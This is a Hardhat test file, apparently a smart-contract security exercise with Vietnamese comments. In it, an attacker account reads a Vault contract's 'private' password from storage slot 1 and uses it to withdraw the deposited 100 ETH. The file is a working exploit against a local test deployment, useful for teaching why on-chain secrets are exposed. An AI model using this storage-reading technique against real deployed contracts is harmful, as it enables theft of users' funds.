const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Vault", function ()  {
    let deployer, attacker;

    beforeEach(async function () {
        [deployer, attacker] = await ethers.getSigners();
        const Vault = await ethers.getContractFactory("Vault", deployer);
        vault = await Vault.deploy(ethers.utils.formatBytes32String("myPassword"));//chuyển string về dạng bytes32
        await vault.deposit({value: ethers.utils.parseEther("100")});
    });

    it("Should return owner of the vault", async function () {
        expect(await vault.owner()).to.eq(deployer.address);
    });

    it("Should be able to retreive private state variables", async function () {
        const initialBalanceContract = await ethers.provider.getBalance(vault.address);
        const initialBalanceAttacker = await ethers.provider.getBalance(attacker.address);

        console.log("Contract Initial balance: ", ethers.utils.formatEther(initialBalanceContract));
        console.log("Attacker Initial balance: ", ethers.utils.formatEther(initialBalanceAttacker));

        const pwd = await ethers.provider.getStorageAt(vault.address, 1);
        //CỰC QUAN TRỌNG: contract này extend Ownable, mà trong source Ownable thì biến _ownable đã nằm ở slot lưu trữ số 0 của EVM
        //Nên biến password bên Vault sẽ nằm ở slot 1

        const password = await ethers.utils.parseBytes32String(pwd);

        console.log("=============");
        console.log(password);

        await vault.connect(attacker).withdraw(pwd);

        const finalBalanceContract = await ethers.provider.getBalance(vault.address);
        const finalBalanceAttacker = await ethers.provider.getBalance(attacker.address);

        console.log(ethers.utils.formatEther(finalBalanceContract), ethers.utils.formatEther(finalBalanceAttacker));
    })

})
